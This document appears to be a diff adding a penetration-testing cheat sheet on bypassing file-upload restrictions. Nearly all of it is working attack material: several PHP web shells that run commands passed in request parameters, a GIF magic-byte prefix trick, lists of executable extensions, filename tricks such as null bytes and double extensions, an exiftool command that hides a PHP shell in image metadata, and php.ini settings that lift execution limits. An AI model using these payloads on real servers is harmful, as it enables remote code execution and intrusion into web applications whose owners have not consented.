@@ -1,0 +1,82 @@
+File Upload bypass
+
+#Content
+
+GIF89a1
+<?php $a=system($_GET['cmd']); echo $a;?>
+<?php system('whoami'); ?>
+<?php exec('whoami'); ?>
+<?php passthru('whoami'); ?>
+<?php shell_exec('whoami'); ?>
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
+
+
+# Filters
+
+evil.png;.php
+evil.gif.php
+evil.gif.php5
+evil.php;gif
+evil.config
+evil.htaccess
+
+ --other-extensions--
+php3
+php4
+php5
+php7
+pht
+phtm
+phtml
+phar
+phps
+
+PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc
+ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
+Jsp: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
+Coldfusion: .cfm, .cfml, .cfc, .dbm
+Flash: .swf
+Perl: .pl, .cgi
+Erlang Yaws Web Server: .yaws
+
+# Bypass file extensions checks
+
+-Try upper cases: pHp, .pHP5, .PhAr ...
+-Add a valid extension before the execution extension: file.png.Php5
+-Add special characters at the end. Use burpsuite-intruder to make it easy.
+
+file.php%20
+file.php%0a
+file.php%00
+file.php%0d%0a
+file.php/
+file.php.\
+file.
+file.php....
+file.pHp5....
+
+-Try to bypass the protections tricking the extension parser of the server-side with techniques like doubling the extension or adding junk data (null bytes) between extensions.
+
+file.png.php
+file.png.pHp5
+file.php%00.png
+file.php\x00.png
+file.php%0a.png
+file.php%0d%0a.png
+flile.phpJunk123png
+
+# Metatag with exif tool
+
+exiftool -Comment='<?php system($_REQUEST['cmd']); ?>' test.png
+
+https://4061201170-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MWd-VcvRHVgUtkahm85%2F-MXHfTwQGzXRX49GrnRK%2F-MXHgfOQxDwk5lX-HvuP%2Fimage.png?alt=media&token=7f37cf9b-0f9e-45ab-b3fc-4e639e02de0e
+
+# php.ini file to bypass restrictions
+
+safe_mode = Off
+disable_functions = NONE
+safe_mode_gid = OFF
+open_basedir = OFF
+exec = ON 
+shell_exec = ON
